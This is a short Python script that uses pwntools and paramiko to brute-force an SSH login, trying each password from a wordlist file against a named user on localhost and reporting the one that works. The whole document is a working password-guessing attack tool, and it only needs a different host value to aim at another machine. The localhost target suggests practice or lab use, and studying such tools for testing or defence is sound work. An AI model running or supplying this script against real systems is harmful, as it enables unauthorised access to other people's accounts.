from pwn import *
import paramiko

host = "127.0.0.1"
username = "Drish"
attempts = 1

with open("passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("Attempt {} password '{}' ".format(attempts,password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[X] Valid password found {}".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            attempts += 1
